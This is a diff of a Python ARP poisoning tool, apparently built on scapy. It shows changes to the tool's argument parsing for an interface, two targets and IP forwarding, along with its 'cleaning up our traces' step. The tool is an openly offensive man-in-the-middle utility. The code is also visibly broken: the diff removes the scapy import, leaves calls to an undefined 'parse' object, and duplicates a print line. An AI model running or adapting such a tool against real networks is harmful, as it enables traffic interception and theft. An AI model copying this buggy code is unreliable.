@@ -1,15 +1,6 @@
 #! /usr/bin/python
 
 #Importing a scapy:
-try:
-    from logging import getLogger, Error
-    getLogger('scapy.runtime').setLevel(ERROR)
-    from scapy.all.import *
-    conf.verb = 0
-
-except ImportError:
-    print("[!] Failed to Import Scapy")
-    sys.exit
 
 #Creating a pre attack module
 
@@ -58,36 +49,40 @@ class Attack(object):
 
 #Taking user inputs via terminal
 
-if __name__ = '__main__':
+if __name__ == '__main__':
 
     import sys
-    import argparse
     from datetime import datetime
     from time import sleep as pause
-    parser =argparse.ArgumentParser(description='ARP Poisoning Tool')
-    parser.add_argument('-i','--interface', help='Network interface to attack on', action='store',dest='interface', default=False)
-    parser.add_argument('-t1','target1',help='First target for poisoning', action = 'store',dest='target1',default='False')
-    parser.add_argument('-t2','target1',help='Second target for poisoning', action = 'store',dest='target2',default='False')
+    
+    import argparse
+    parser = argparse.ArgumentParser(description='ARP Poisoning Tool')
+    parser.add_argument('-i', '--interface', help='Network interface to attack on', action='store', dest='interface', default=False)
+    parser.add_argument('-t1', '--target1', help='First target for poisoning', action='store', dest='target1', default='False')
+    parser.add_argument('-t2', '--target2', help='Second target for poisoning', action='store', dest='target2', default='False')
     parser.add_argument('-f', '--forward', help='Auto-toggle IP forwarding', action='store_true', dest='forward', default=False)
     parser.add_argument('-q', '--quiet', help='Disable feedback messages', action='store_true', dest='quiet', default=False)
     parser.add_argument('--clock', help='Track attack duration', action='store_true', dest='time', default=False)
-
-    args = parse.parse_args()
+    
+    args = parser.parse_args()
+    
+    
+    
 #if no arguments have been passed to the script, then the code proceeds to print the help information the the script ends 
     if len(sys.argv) == 1:
         parse.print_help()
         sys.exit(1)
 #incase of invalid targets entry
-    elif ((not args.targe1) or (not args.target2)):
-        parse.error("Invalid Target Specification")
-        sys.exit(1)
+    elif (not args.interface) or ((not args.target1) or (not args.target2)):
+         parse.error('Invalid arguments')
+         sys.exit(1)
 
     elif not args.interface:
         parse.error("No network interface given: ")
         sys.exit(1)
 
 #Executing the attack
-       start_Time = datetime.now()
+    start_Time = datetime.now()
     targets = [args.target1, args.target2]
     print ('[*] Resolving Target Addresses...'),; sys.stdout.flush()
     try:
@@ -132,7 +127,7 @@ if __name__ = '__main__':
             break
 
     #Cleaning up our traces 
-     print('\n[*] Fixing Targets...'),; sys.stdout.flush()
+    print('\n[*] Fixing Targets...'),; sys.stdout.flush()
     for i in range(0, 16):
         try:
             Attack(targets, args.interface).send_Fix(MACs)
@@ -149,4 +144,5 @@ if __name__ = '__main__':
     except IOError:
         print('[FAIL]') 
     if args.time:
+        print('[*] Attack Duration: %s' %(datetime.now() - start_Time)) 
         print('[*] Attack Duration: %s' %(datetime.now() - start_Time)) 
